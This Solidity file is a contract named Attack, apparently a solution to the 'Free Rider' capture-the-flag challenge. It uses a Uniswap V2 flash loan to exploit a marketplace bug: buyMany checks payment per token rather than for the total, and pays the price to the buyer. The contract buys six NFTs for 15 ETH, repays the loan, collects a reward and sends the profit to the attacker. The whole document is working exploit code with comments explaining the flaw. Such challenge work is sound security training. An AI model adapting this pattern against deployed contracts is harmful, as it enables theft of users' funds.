// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external view returns (address);

    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWeth {
    function withdraw(uint256 wad) external;

    function deposit() external payable;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract Attack is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public immutable uniswapV2Pair;
    IUniswapV2Factory public immutable uniswapV2Factory;
    IFreeRiderNFTMarketplace public immutable freeRiderNFTMarketplace;
    IERC721 public immutable nft;

    address public immutable freeRiderBuyer;

    uint256 public constant LOAN_AMOUNT = 15e18;
    uint256 public constant LOAN_REPAY_AMOUNT = 15.45e18; // Loan amount + 0.3% fee

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        IUniswapV2Pair _uniswapV2Pair,
        IUniswapV2Factory _uniswapV2Factory,
        IFreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        IERC721 _nft,
        address _freeRiderBuyer
    ) {
        uniswapV2Pair = _uniswapV2Pair;
        uniswapV2Factory = _uniswapV2Factory;
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        nft = _nft;
        freeRiderBuyer = _freeRiderBuyer;
    }

    receive() external payable {}

    function attack() external {
        // Initiating flashloan
        uniswapV2Pair.swap(LOAN_AMOUNT, 0, address(this), "nty"); // We know already that token 0 is WETH
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender ==
                IUniswapV2Factory(uniswapV2Factory).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair

        // Swapping weth for eth
        IWeth(token0).withdraw(LOAN_AMOUNT);

        // Buying all 6 six NFTs from the loan of 15 ether - thanks to the vulnerability present in marketplace contract
        // that allows buyer to buy all the NFTs just for 15 eth instead of 90 eth
        freeRiderNFTMarketplace.buyMany{value: LOAN_AMOUNT}(tokenIds);

        // Swapping eth for weth so we can repay the loan
        IWeth(token0).deposit{value: LOAN_REPAY_AMOUNT}();

        // Paying back the loan to uniswapV2Pair contract
        IWeth(token0).transfer(msg.sender, LOAN_REPAY_AMOUNT);

        // Transferring the NFTs to the Buyer contract so we can get 45 eth rewards from our partner
        for (uint256 i; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, i);
        }

        // We received 90 eth in this contract as well due to the bug in marketplace contract that transfers 'nft price' to the buyer
        // instead of the seller, so transferring it ( 90 eth - 15.45 eth) back to the attacker address
        payable(tx.origin).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
